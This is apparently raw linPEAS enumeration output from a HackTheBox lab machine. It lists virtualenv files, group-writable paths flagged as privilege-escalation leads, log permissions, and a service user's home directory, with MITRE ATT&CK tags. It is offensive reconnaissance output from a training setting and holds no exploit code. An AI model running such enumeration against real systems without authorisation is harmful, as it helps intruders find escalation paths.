/var/www/smarthire.htb/.venv[1;31m/bin/[0mactivate
/var/www/smarthire.htb/.venv[1;31m/bin/[0mactivate.csh
/var/www/smarthire.htb/.venv[1;31m/bin/[0mactivate.fish
/var/www/smarthire.htb/.venv[1;31m/bin/[0mActivate.ps1
/var/www/smarthire.htb/.venv[1;31m/bin/[0malembic
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/var/www/smarthire.htb/.venv/include
/var/www/smarthire.htb/.venv/include/site
/var/www/smarthire.htb/.venv/include/site/python3.10
/var/www/smarthire.htb/.venv/include/site/python3.10/greenlet
/var/www/smarthire.htb/.venv/include/site/python3.10/greenlet/greenlet.h
/var/www/smarthire.htb/.venv/lib
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic-1.16.5.dist-info
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic-1.16.5.dist-info/entry_points.txt
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic-1.16.5.dist-info/INSTALLER
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic-1.16.5.dist-info/licenses
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic-1.16.5.dist-info/licenses/LICENSE
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic-1.16.5.dist-info/METADATA
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic-1.16.5.dist-info/RECORD
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic-1.16.5.dist-info/REQUESTED
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic-1.16.5.dist-info/top_level.txt
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic-1.16.5.dist-info/WHEEL
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/autogenerate
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/autogenerate/api.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/autogenerate/compare.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/autogenerate/__init__.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/autogenerate/__pycache__
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/autogenerate/__pycache__/api.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/autogenerate/__pycache__/compare.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/autogenerate/__pycache__/__init__.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/autogenerate/__pycache__/render.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/autogenerate/__pycache__/rewriter.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/autogenerate/render.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/autogenerate/rewriter.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/command.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/config.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/context.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/context.pyi
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/ddl
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/ddl/_autogen.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/ddl/base.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/ddl/impl.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/ddl/__init__.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/ddl/mssql.py
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/ddl/__pycache__/_autogen.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/ddl/__pycache__/base.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/ddl/__pycache__/impl.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/ddl/__pycache__/__init__.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/ddl/__pycache__/mssql.cpython-310.pyc
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/ddl/sqlite.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/environment.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/__init__.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/__main__.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/migration.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/operations
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/operations/base.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/operations/batch.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/operations/__init__.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/operations/ops.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/operations/__pycache__
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/operations/__pycache__/base.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/operations/__pycache__/batch.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/operations/__pycache__/__init__.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/operations/__pycache__/ops.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/operations/__pycache__/schemaobj.cpython-310.pyc
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/operations/schemaobj.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/operations/toimpl.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/op.py
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/op.pyi
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/__pycache__
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/__pycache__/command.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/__pycache__/config.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/__pycache__/context.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/__pycache__/environment.cpython-310.pyc
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/__pycache__/__init__.cpython-310.pyc
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/py.typed
/var/www/smarthire.htb/.venv[1;31m/lib/[0mpython3.10/site-packages/alembic/runtime

[1;34m╔══════════╣ [1;32mInteresting GROUP writable files (not in Home) (max 200) [1;90m(T1574.009,T1574.010)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
[0m  Group [1;32msvcweb:
[0m/var/www/smarthire.htb/smarthire.db
/opt/mlflow/app
  Group [1;32mdevs:
[0m/opt/tools/mlflow_ctl/plugins/dev


[1;34m╔══════════╣ [1;32mWritable root-owned executables I can modify (max 200) [1;90m(T1574.009,T1574.010)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
[0m[1;90mWritable root-owned executables Not Found
[0m


[1;34m                            ╔═════════════════════════╗
════════════════════════════╣ [1;32mOther Interesting Files[1;34m ╠════════════════════════════
[1;34m                            ╚═════════════════════════╝[0m
[1;34m╔══════════╣ [1;32m.sh files in path [1;90m(T1574.007)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
[0m/usr/bin[1;32m/gettext.sh[0m
/usr/bin[1;32m/rescan-scsi-bus.sh[0m

[1;34m╔══════════╣ [1;32mExecutable files potentially added by user (limit 70) [1;90m(T1083)
[0m2025-09-16+08:21:21.9583822060 /var/www/smarthire.htb/.venv/bin/mlflow
2025-09-16+08:21:20.7984037190 /var/www/smarthire.htb/.venv/bin/alembic
2025-09-16+08:21:20.6104072070 /var/www/smarthire.htb/.venv/bin/flask
2025-09-16+08:21:15.0185109890 /var/www/smarthire.htb/.venv/bin/gunicorn
2025-09-16+08:21:14.8465141830 /var/www/smarthire.htb/.venv/bin/mako-render
2025-09-16+08:21:10.0586031400 /var/www/smarthire.htb/.venv/bin/normalizer
2025-09-16+08:21:09.9426052960 /var/www/smarthire.htb/.venv/bin/ttx
2025-09-16+08:21:09.9426052960 /var/www/smarthire.htb/.venv/bin/pyftsubset
2025-09-16+08:21:09.9426052960 /var/www/smarthire.htb/.venv/bin/pyftmerge
2025-09-16+08:21:09.9426052960 /var/www/smarthire.htb/.venv/bin/fonttools
2025-09-16+08:21:08.9786232190 /var/www/smarthire.htb/.venv/bin/markdown_py
2025-09-16+08:21:08.9026246320 /var/www/smarthire.htb/.venv/bin/f2py
2025-09-16+08:21:07.1426573620 /var/www/smarthire.htb/.venv/bin/dotenv
2025-09-16+08:21:07.0546589980 /var/www/smarthire.htb/.venv/bin/sqlformat
2025-09-16+08:20:46.5110419600 /var/www/smarthire.htb/.venv/bin/pip3.10
2025-09-16+08:20:46.5110419600 /var/www/smarthire.htb/.venv/bin/pip3
2025-09-16+08:20:46.5110419600 /var/www/smarthire.htb/.venv/bin/pip
2025-09-16+07:54:21.3238429090 /var/www/smarthire.htb/wsgi.py
2025-09-15+10:06:07.1414900760 /etc/cloud/clean.d/99-installer

[1;34m╔══════════╣ [1;32mUnexpected in /opt (usually empty) [1;90m(T1083)
[0mtotal 20
drwxr-xr-x  5 root root 4096 Feb 19 19:01 .
drwxr-xr-x 19 root root 4096 May 13 16:02 ..
drwx--x--x  4 root root 4096 Sep 16  2025 containerd
drwxr-xr-x  3 root root 4096 Sep 17  2025 mlflow
drwxr-xr-x  3 root root 4096 Feb 19 15:50 tools

[1;34m╔══════════╣ [1;32mUnexpected in root [1;90m(T1083)
[0m
[1;34m╔══════════╣ [1;32mModified interesting files in the last 5mins (limit 100) [1;90m(T1083)
[0m[1;31m/tmp[0m/output.txt
[1;31m/home/svcweb[0m/.bash_history
/var/log/kern.log
/var/log/nginx/access.log
/var/log/laurel/audit.log.11
/var/log/laurel/audit.log.8
/var/log/laurel/audit.log.7
/var/log/laurel/audit.log.9
/var/log/laurel/audit.log.12
/var/log/laurel/audit.log.1
/var/log/laurel/audit.log.14
/var/log/laurel/audit.log.13
/var/log/laurel/audit.log.2
/var/log/laurel/audit.log.6
/var/log/laurel/audit.log.3
/var/log/laurel/audit.log.4
/var/log/laurel/audit.log.10
/var/log/laurel/audit.log
/var/log/laurel/audit.log.5
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f0c9-000655986d960aad.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/user-1000.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f150-000655986dbf5364.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/user-1000@bbff2d23f41d4b9a84579b96d29406c4-000000000009cf03-000655984447e96e.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f1d5-000655986dc4ddfd.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f0e9-000655986d9833c4.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f1e1-000655986dc54dac.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f0dc-000655986d97294b.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f16a-000655986dc1a52a.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f0f5-000655986d98c30a.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f169-000655986dc13da2.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009d97e-000655986d49e01b.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f1e2-000655986dc5b5b4.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f0f6-000655986d9932f5.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f0e8-000655986d97a65a.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f1c8-000655986dc3f26e.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f15d-000655986dc0d759.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f14f-000655986dbe9440.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f0c8-000655986d95781f.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f21f-000655986dc64fbd.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f0c1-000655986d943961.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f0c2-000655986d95136f.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f220-000655986dc6c917.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f255-000655986e3dcec5.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f243-000655986dc73f64.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-0000000000083530-00065597e7f5478c.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f17a-000655986dc22503.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f1d4-000655986dc45f10.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f0db-000655986d968af2.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f1c7-000655986dc36bc4.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f11a-000655986d99a7eb.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-00000000000be18f-0006559874021ca7.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f244-000655986dc7c07b.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f11b-000655986d9a0b25.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f25b-000655986e3ed613.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-00000000000b97ec-0006559873821ef1.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/user-1000@bbff2d23f41d4b9a84579b96d29406c4-00000000000c093c-0006559875823b31.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/user-1000@bbff2d23f41d4b9a84579b96d29406c4-00000000000b5c6c-0006559872a3a6a3.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f15c-000655986dc019af.journal
/var/log/journal/72b9e415264c45ab9537b82ecca388fa/system@90d076b9ad0a4dd0b75674546768208f-000000000009f17b-000655986dc2da49.journal
/var/log/auth.log
/var/log/syslog

[1;34m╔══════════╣ [1;32mSyslog configuration (limit 50) [1;90m(T1070.002)
[0m[1;31m[0m
[1;31m[0m
[1;31m[0m
[1;31mmodule(load="imuxsock") # provides support for local system logging[0m
[1;31m[0m
[1;31m[0m
[1;31m[0m
[1;31mmodule(load="imklog" permitnonkernelfacility="on")[0m
[1;31m[0m
[1;31m[0m
[1;31m$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat[0m
[1;31m[0m
[1;31m$RepeatedMsgReduction on[0m
[1;31m[0m
[1;31m$FileOwner syslog[0m
[1;31m$FileGroup adm[0m
[1;31m$FileCreateMode 0640[0m
[1;31m$DirCreateMode 0755[0m
[1;31m$Umask 0022[0m
[1;31m$PrivDropToUser syslog[0m
[1;31m$PrivDropToGroup syslog[0m
[1;31m[0m
[1;31m$WorkDirectory /var/spool/rsyslog[0m
[1;31m[0m
[1;31m$IncludeConfig /etc/rsyslog.d/*.conf[0m
[1;34m╔══════════╣ [1;32mAuditd configuration (limit 50) [1;90m(T1070.002)
[0m[1;90mauditd configuration Not Found
[0m[1;34m╔══════════╣ [1;32mLog files with potentially weak perms (limit 50) [1;90m(T1070.002)
[0m[1;31m   131214     24 -rw-r-----   1 root     adm         22405 May 13 15:27 /var/log/dmesg.2.gz[0m
[1;31m   131148    532 -rw-r-----   1 syslog   adm        544026 Jul  2 02:35 /var/log/kern.log.1[0m
[1;31m   131340      4 -rw-r-----   1 syslog   adm          1255 Jul  2 03:30 /var/log/kern.log[0m
[1;31m   131140      8 -rw-r-----   1 syslog   adm          7463 Jul  2 02:35 /var/log/auth.log.1[0m
[1;31m   131204      0 -rw-r-----   1 root     adm             0 Jul  2 02:35 /var/log/apt/term.log[0m
[1;31m   131215      4 -rw-r-----   1 root     adm           527 May 13 16:02 /var/log/apt/term.log.1.gz[0m
[1;31m   132215   4884 -rw-------   1 _laurel  _laurel   5000226 Jul  2 02:53 /var/log/laurel/audit.log.21[0m
[1;31m   131894   4884 -rw-------   1 _laurel  _laurel   5000366 Jul  2 02:51 /var/log/laurel/audit.log.29[0m
[1;31m   133143   4884 -rw-------   1 _laurel  _laurel   5000858 Jul  2 03:31 /var/log/laurel/audit.log.11[0m
[1;31m   133417   4884 -rw-------   1 _laurel  _laurel   5000057 Jul  2 03:32 /var/log/laurel/audit.log.8[0m
[1;31m   131599   4884 -rw-------   1 _laurel  _laurel   5001141 Jul  2 03:33 /var/log/laurel/audit.log.7[0m
[1;31m   131489   4884 -rw-------   1 _laurel  _laurel   5000129 Jul  2 02:44 /var/log/laurel/audit.log.52[0m
[1;31m   131669   4884 -rw-------   1 _laurel  _laurel   5000634 Jul  2 02:46 /var/log/laurel/audit.log.44[0m
[1;31m   132269   4884 -rw-------   1 _laurel  _laurel   5000431 Jul  2 02:53 /var/log/laurel/audit.log.18[0m
[1;31m   131919   4884 -rw-------   1 _laurel  _laurel   5000281 Jul  2 02:53 /var/log/laurel/audit.log.20[0m
[1;31m   131805   4884 -rw-------   1 _laurel  _laurel   5000434 Jul  2 02:51 /var/log/laurel/audit.log.28[0m
[1;31m   131638   4884 -rw-------   1 _laurel  _laurel   5000259 Jul  2 02:45 /var/log/laurel/audit.log.48[0m
[1;31m   133387   4888 -rw-------   1 _laurel  _laurel   5001404 Jul  2 03:31 /var/log/laurel/audit.log.9[0m
[1;31m   131971   4884 -rw-------   1 _laurel  _laurel   5000101 Jul  2 02:52 /var/log/laurel/audit.log.26[0m
[1;31m   131751   4884 -rw-------   1 _laurel  _laurel   5000524 Jul  2 02:48 /var/log/laurel/audit.log.37[0m
[1;31m   131549   4884 -rw-------   1 _laurel  _laurel   5000122 Jul  2 03:30 /var/log/laurel/audit.log.12[0m
[1;31m   131200   4884 -rw-------   1 _laurel  _laurel   5000114 Jul  2 02:51 /var/log/laurel/audit.log.30[0m
[1;31m   131139   4884 -rw-------   1 _laurel  _laurel   5000364 Jul  2 03:34 /var/log/laurel/audit.log.1[0m
[1;31m   132181   4884 -rw-------   1 _laurel  _laurel   5000511 Jul  2 02:52 /var/log/laurel/audit.log.23[0m
[1;31m   131949   4884 -rw-------   1 _laurel  _laurel   5000071 Jul  2 02:51 /var/log/laurel/audit.log.27[0m
[1;31m   131488   4884 -rw-------   1 _laurel  _laurel   5000526 Jul  2 02:44 /var/log/laurel/audit.log.53[0m
[1;31m   131834   4884 -rw-------   1 _laurel  _laurel   5000234 Jul  2 02:49 /var/log/laurel/audit.log.33[0m
[1;31m   131443   4884 -rw-------   1 _laurel  _laurel   5000256 Jul  2 02:44 /var/log/laurel/audit.log.55[0m
[1;31m   131611   4884 -rw-------   1 _laurel  _laurel   5000636 Jul  2 02:45 /var/log/laurel/audit.log.49[0m
[1;31m   131491   4884 -rw-------   1 _laurel  _laurel   5000326 Jul  2 02:45 /var/log/laurel/audit.log.51[0m
[1;31m   132187   4884 -rw-------   1 _laurel  _laurel   5000584 Jul  2 02:52 /var/log/laurel/audit.log.22[0m
[1;31m   132275   4884 -rw-------   1 _laurel  _laurel   5000447 Jul  2 03:30 /var/log/laurel/audit.log.14[0m
[1;31m   131693   4884 -rw-------   1 _laurel  _laurel   5000335 Jul  2 02:47 /var/log/laurel/audit.log.40[0m
[1;31m   131646   4884 -rw-------   1 _laurel  _laurel   5000696 Jul  2 02:46 /var/log/laurel/audit.log.47[0m
[1;31m   132527   4884 -rw-------   1 _laurel  _laurel   5000251 Jul  2 03:30 /var/log/laurel/audit.log.13[0m
[1;31m   132274   4884 -rw-------   1 _laurel  _laurel   5000522 Jul  2 02:54 /var/log/laurel/audit.log.15[0m
[1;31m   131484   4884 -rw-------   1 _laurel  _laurel   5000676 Jul  2 02:44 /var/log/laurel/audit.log.54[0m
[1;31m   133469   4884 -rw-------   1 _laurel  _laurel   5000099 Jul  2 03:34 /var/log/laurel/audit.log.2[0m
[1;31m   131712   4884 -rw-------   1 _laurel  _laurel   5000694 Jul  2 02:48 /var/log/laurel/audit.log.38[0m
[1;31m   133434   4884 -rw-------   1 _laurel  _laurel   5000573 Jul  2 03:33 /var/log/laurel/audit.log.6[0m
[1;31m   131645   4884 -rw-------   1 _laurel  _laurel   5000816 May 13 16:20 /var/log/laurel/audit.log.60[0m
[1;31m   131979   4884 -rw-------   1 _laurel  _laurel   5000154 Jul  2 02:52 /var/log/laurel/audit.log.24[0m
[1;31m   131752   4884 -rw-------   1 _laurel  _laurel   5000683 Jul  2 02:48 /var/log/laurel/audit.log.36[0m
[1;31m   131689   4884 -rw-------   1 _laurel  _laurel   5000650 Jul  2 02:47 /var/log/laurel/audit.log.42[0m
[1;31m   131679   4884 -rw-------   1 _laurel  _laurel   5000323 Jul  2 02:47 /var/log/laurel/audit.log.43[0m
[1;31m   133468   4884 -rw-------   1 _laurel  _laurel   5000591 Jul  2 03:34 /var/log/laurel/audit.log.3[0m
[1;31m   131977   4884 -rw-------   1 _laurel  _laurel   5000256 Jul  2 02:52 /var/log/laurel/audit.log.25[0m
[1;31m   131647   4884 -rw-------   1 _laurel  _laurel   5000120 Jul  2 02:46 /var/log/laurel/audit.log.46[0m
[1;31m   133467   4884 -rw-------   1 _laurel  _laurel   5000015 Jul  2 03:34 /var/log/laurel/audit.log.4[0m
[1;31m   132272   4884 -rw-------   1 _laurel  _laurel   5000070 Jul  2 02:53 /var/log/laurel/audit.log.17[0m

[1;34m╔══════════╣ [1;32mFiles inside /home/svcweb (limit 20) [1;90m(T1083)
[0mtotal 44
drwxr-x--- 6 svcweb svcweb 4096 May 13 16:15 .
drwxr-xr-x 3 root   root   4096 Sep 15  2025 ..
-rw------- 1 svcweb svcweb  115 Jul  2 03:29 .bash_history
-rw-r--r-- 1 svcweb svcweb  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svcweb svcweb 3771 Jan  6  2022 .bashrc
drwx------ 2 svcweb svcweb 4096 Sep 15  2025 .cache
drwx------ 3 svcweb svcweb 4096 Jul  2 03:33 .gnupg
drwxrwxr-x 3 svcweb svcweb 4096 Sep 16  2025 .local
-rw-r--r-- 1 svcweb svcweb  807 Jan  6  2022 .profile
lrwxrwxrwx 1 root   root      9 Sep 16  2025 .python_history -> /dev/null
drwx------ 2 svcweb svcweb 4096 May 12 16:00 .ssh
-rw-r--r-- 1 svcweb svcweb    0 Sep 15  2025 .sudo_as_admin_successful
-rw-r----- 1 root   svcweb   33 Jul  2 02:36 user.txt

[1;34m╔══════════╣ [1;32mFiles inside others home (limit 20) [1;90m(T1552.001)
[0m/var/www/smarthire.htb/__pycache__/wsgi.cpython-310.pyc
/var/www/smarthire.htb/__pycache__/app.cpython-310.pyc
/var/www/smarthire.htb/__pycache__/config.cpython-310.pyc
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/sandbox.py
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/gui-arm64.exe
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/__pycache__/pyparsing.cpython-310.pyc
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/__pycache__/ordered_set.cpython-310.pyc
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/__pycache__/__init__.cpython-310.pyc
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/packaging/_musllinux.py
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/packaging/__about__.py
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/packaging/__pycache__/_musllinux.cpython-310.pyc
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/packaging/__pycache__/__about__.cpython-310.pyc
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/packaging/__pycache__/requirements.cpython-310.pyc
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/packaging/__pycache__/markers.cpython-310.pyc
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/packaging/__pycache__/version.cpython-310.pyc
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/packaging/__pycache__/utils.cpython-310.pyc
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/packaging/__pycache__/tags.cpython-310.pyc
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/packaging/__pycache__/_structures.cpython-310.pyc
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/packaging/__pycache__/specifiers.cpython-310.pyc
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/setuptools/_vendor/packaging/__pycache__/__init__.cpython-310.pyc

[1;34m╔══════════╣ [1;32mSearching installed mail applications [1;90m(T1114.001)
[0m
[1;34m╔══════════╣ [1;32mMails (limit 50) [1;90m(T1114.001)
[0m
[1;34m╔══════════╣ [1;32mBackup folders [1;90m(T1552.001)
[0mdrwx------ 2 root root 4096 May 13 12:41 /etc/lvm/[1;31mbackup[0m

[1;34m╔══════════╣ [1;32mBackup files (limited 100) [1;90m(T1552.001)
[0m-rw-r--r-- 1 root root 4096 Jul  2 03:34 /sys/devices/virtual/net/veth9bb26eb/brport/[1;31mbackup[0m_port
-rw-r--r-- 1 root root 0 Sep 11  2024 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-[1;31mbackup[0m.timer
